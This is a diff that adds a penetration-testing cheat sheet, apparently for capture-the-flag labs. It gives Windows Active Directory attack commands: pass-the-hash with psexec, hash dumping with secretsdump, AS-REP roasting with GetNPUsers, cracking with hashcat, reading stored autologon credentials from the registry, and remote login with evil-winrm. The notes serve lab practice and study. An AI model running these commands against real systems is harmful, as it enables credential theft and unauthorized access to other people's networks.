@@ -1,1 +1,86 @@
+Impacket: https://github.com/fortra/impacket
+
+Useful Impacket tools:
+
+  psexec.py - You can use psexec to pass-the-(NT)hash to get system privileges.  A valid administrator account username and hash are needed.
+    sudo python3 psexec.py -hashes :<password_hash> Administrator@IP_ADDRESS
+
+  secretsdump.py - Use this to dump password hashes from NTDS.DIT from a domain server.  Requires valid user credentials.  
+    python3 ./secretsdump.py <domain_name>/<username>@IP_ADDRESS
+      Adding the flag -just-dc-ntlm will make it dump only the Lanman and NT hashes.
+
+  GetNPUsers.py - Extracts the Kerberos krb5asrep hashes for users from the domain controller.  This requires a valid DOMAINNAME/username pair to run.  Will only extract hashes for users that do not require Kerberos pre-authentication.
+    python3 GetNPUsers.py -outputfile <out_file> -format hashcat -usersfile <username_file> -no-pass -dc-ip 10.10.10.175 <domain_name>/<user_name>
+===============================================================================================================================================================================
+
+Extracting Windows Auto-logon credentials with reg query
+    The command reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" will output any stored Windows Auto-logon credentials.
+
+===============================================================================================================================================================================
+
+Using hashcat to crack Kerberos hashes
+  In order to crack krb5asrep type hashes the -m 18200 option is needed.
+    hashcat -m 18200 -a 0 <input_file> <wordlist> --force
+
+===============================================================================================================================================================================
+
+Enumerating valid usernames through kerberos using MetaSploit
+  In the Metasploit console the auxiliary(gather/kerberos_enumusers) tool enumerates valid users against Kerberos from a list.  This scanner also checks if each user has "pre-auth required" enabled.
+
+===============================================================================================================================================================================
+
+Enumeration:
+
+  Nmap scan:
+    sudo nmap -p- -sC -sV -oN FILE_NAME IP_ADDERESS
+
+  ldapsearch enumeration:
+    ldapsearch -H ldap://IP_ADDRESS:PORT -x -LLL -s sub -b "DC=DOMAIN,DC=TLD" - (3268/tcp  open  ldap)
+
+===============================================================================================================================================================================
+
+Finding user creds:
+  Using metasploit: auxiliary/gather/kerberos_enumusers
+    msf5 auxiliary(gather/kerberos_enumusers) > run
+
+  GetNPUsers - This is used to get the krb5asrep hashes when there is no pre-authentication check: 
+    python3 GetNPUsers.py -outputfile BOXNAME.hash -format hashcat -usersfile LOCATION/TO/USERS/LIST/users -no-pass -dc-ip BOX_IP_ADDRESS DOMAIN/USERNAME
+
+      GetNPUsers.py doesn't inform you when it finds a valid user and gets the hash, so pay attention to your output files! 
+
+===============================================================================================================================================================================
+
+Crack the hashes that you got from Metasploit & GetNPUsers:
+  hashcat -m 18200 -a 0 BOX_NAME.hash PATH/TO/rockyou.txt --force
+
+===============================================================================================================================================================================
+
+Once you got credentials you can remote on to the machine using:
+
+  evil-winrm:
+    evil-winrm -i IP_ADDRESS -u USERNAME
+
+===============================================================================================================================================================================
+
+Enumeration while on the target machien:
+
+  whoami /all
+
+  Here's a tool that makes Windws enumeration easy: https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
+
+  Where to find auto-login credentials:
+    reg query HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
+
+  Don't forget, if there are other accounts on the machine you can try moving latterally to see if you can find anything else interesting 
+
+  If you have credentials you can use Impacket's secretsdump.py to try to dump password hashes. These hashes can then be used to either crack and retrieve the passwords or in a pass-the-hash attack.  
+    python3 ./secretsdump.py -just-dc-ntlm DOMAIN/USERNAME@IP_ADDRESS
+
+
+===============================================================================================================================================================================
+  
+Pass the hash:
+
+  sudo python3 psexec.py -hashes :HASH_OF_USER USERNAME@IPADDRESS
+
 
